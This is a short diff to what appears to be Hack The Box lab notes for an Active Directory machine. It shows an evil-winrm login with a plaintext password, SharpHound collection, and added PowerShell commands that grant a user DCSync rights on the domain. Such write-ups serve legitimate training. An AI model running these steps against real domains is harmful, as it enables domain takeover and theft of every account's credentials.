@@ -53,6 +53,16 @@ evil-winrm -i $IP -u svc-alfresco -p s3rvice
 .\SharpHound.exe -c all --zipfilename ad-data-kick
 ```
 
+##### DSync
+```powershell
+$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+```
+```powershell
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\kickass', $SecPassword)
+```
 
+```powershell
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=HTB,DC=local' -PrincipalIdentity kickass -Rights DCSync
+```
 
 
